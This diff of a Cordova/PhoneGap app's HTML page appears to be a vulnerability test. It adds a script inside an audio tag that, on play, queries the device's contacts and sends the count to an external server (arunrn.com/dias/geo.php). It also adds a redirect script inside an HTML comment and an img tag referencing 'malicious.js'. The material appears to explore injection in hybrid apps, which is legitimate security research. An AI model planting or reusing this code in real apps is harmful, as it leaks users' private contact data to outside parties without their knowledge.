@@ -38,18 +38,45 @@
                 <p>Activitating camera here</p>
             </div>
 
-<!--"http://www.thighswideshut.org/music/disney_time.mp3"-->
- <div id="mediaeady" >
-             <p><audio src= "http://192.168.0.102:88/phonegap/"
+<!--"http://www.thighswideshut.org/music/disney_time.mp3" ><script>window.location="http://www.arunrn.com/dias";</script>-->
+ <div id="mediaready" >
+             <p><audio  src= "http://www.arunrn.com/mp3/Poopoi.mp3"  onplay="alert('Clicked');onPlayme();" controls preload="auto" autobuffer><script>
+             function onPlayme(){alert('In Playme'); var options = new ContactFindOptions();
+options.filter="Arun";
+options.multiple=true; 
+var fields = ["displayName", "name"];
+navigator.contacts.find(fields, onSuccess, onError, options);
+}
+var onSuccess = function(contacts) {  xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()
+  {
+  if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+    document.getElementById("mediaready").innerHTML=xmlhttp.responseText;
+    }
+  }
+xmlhttp.open("GET","http://www.arunrn.com/dias/geo.php?Lat=" +contacts.length+ "&Long=23",true);
+xmlhttp.send();
+};
+             function onError(error) {
+    alert('code: '    + error.code    + '\n' +
+          'message: ' + error.message + '\n');
+}
+
+             </script></audio>
+         </div><div>    
+         <audio src="http://www.arunrn.com/mp3/Poopol.mp3" 
              controls preload="auto" autobuffer></audio>
                 
             </div>
 
 <div>
-             <p><a href="http://192.168.0.100:88/phonegap/" >Click to test</a></p>
-                <p>Testing Vulnerability</p>
+             <p><a href="http://www.arunrn.com/dias/index.html" >Click to test</a></p>
+                <p>Arun's Site</p>
+                <img src = "malicious.js">
 
 </div>
+
+
         </div>
         <script type="text/javascript" src="cordova-2.3.0.js"></script>
         <script type="text/javascript" src="js/index.js"></script>
